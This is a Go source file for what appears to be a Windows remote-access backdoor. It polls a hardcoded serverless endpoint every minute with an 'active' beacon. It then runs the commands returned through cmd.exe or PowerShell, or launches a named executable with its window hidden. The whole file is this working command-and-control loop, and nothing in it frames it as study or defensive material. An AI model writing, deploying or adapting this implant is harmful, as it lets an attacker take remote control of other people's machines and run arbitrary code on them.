package main
import (
	"fmt"
	"net/http"
	"io/ioutil"
	"bytes"
	"encoding/json"
	"os/exec"
	"time"
	"syscall"
	"context"
)

type PayLoad struct{
	Status string `json:"status"`;
	Data string `json:"data"`;
}

func executePowerShell(command string){
	cmd:=exec.Command("powershell","-Command",command); // create PowerShell command
	output,err:=cmd.CombinedOutput(); // get combined output (stdout and stderr)
	if err !=nil{
		fmt.Println("Error executing PowerShell command:",err);
		return;
	}
	fmt.Println("PowerShell output:",string(output));
}

func executeCmd(command string){
	ctx,cancel:=context.WithTimeout(context.Background(),5*time.Second); // set timeout for command executions
	defer cancel(); // ensure resources are cleaned up

	cmd:=exec.CommandContext(ctx,"cmd","/C",command); // create command to execute
	output,err:=cmd.CombinedOutput(); // get combined output (stdout and stderr)
	if ctx.Err() == context.DeadlineExceeded {
		fmt.Println("Command timed out");
		return;
	}
	if err !=nil{
		fmt.Println("Error executing command:",err);
		return;
	}
	fmt.Println("Command output:",string(output));
}

func executeExe(path string){
	cmd := exec.Command(path);
	cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}; // hide console window on Windows
	err:=cmd.Start();
	if err !=nil{
		fmt.Println("Error executing exe:",err);
		return;
	}
	fmt.Println("Exe executed successfully");
}

func postRequest(url string, input PayLoad)(output PayLoad, err error){

	jsonData, err := json.Marshal(input); // convert struct to JSON
	if err !=nil{ 
		return PayLoad{}, err; 
	}
	req,err:=http.NewRequest("POST",url,bytes.NewBuffer(jsonData)); // create new POST request
	if err !=nil{
		return PayLoad{}, err;
	}
	req.Header.Set("Content-Type","application/json"); // set content type to JSON
	client := &http.Client{}; // create new HTTP client
	resp, err := client.Do(req); // send request
	if err !=nil{ // 
		return PayLoad{}, err; 
	}
	defer resp.Body.Close(); // close response body when done
	body,err:=ioutil.ReadAll(resp.Body); // read response body
	if err !=nil{ 
		return PayLoad{}, err;
	}
	
	err = json.Unmarshal(body,&output); // convert JSON response to struct
	if err !=nil{
		return PayLoad{}, err;
	}
	return output,nil;
}

func main(){
	url:="https://faas-ams3-2a2df116.doserverless.co/api/v1/web/fn-2f25c703-39e1-4645-abdb-ee0c9d620425/rst/app"; // define URL

	ticker:=time.NewTicker(1*time.Minute); 
	defer ticker.Stop(); // ensure ticker is stopped when done

	for {
		input,err:=postRequest(url,PayLoad{Status:"active",Data:"sample data"}); // call postRequest function:
		if err !=nil{
			fmt.Println("Error:",err);
			return;
		}else{
			if input.Status=="cmd"{
				executeCmd(input.Data);
			}
			if input.Status=="ps"{
				executePowerShell(input.Data);
			}
			if input.Status=="exe"{
				executeExe(input.Data);
			}
		}
		<-ticker.C;

	}

	
}
